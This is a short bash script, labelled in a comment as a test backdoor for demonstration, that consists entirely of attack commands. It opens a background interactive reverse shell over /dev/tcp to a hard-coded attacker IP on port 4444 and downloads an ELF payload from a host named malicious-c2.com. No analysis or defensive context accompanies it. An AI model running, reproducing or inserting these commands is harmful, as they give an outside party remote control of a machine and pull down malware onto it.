#!/bin/bash
# Test backdoor for demonstration
ATTACKER_IP="45.142.114.231"
bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1 &
wget http://malicious-c2.com/payload.elf
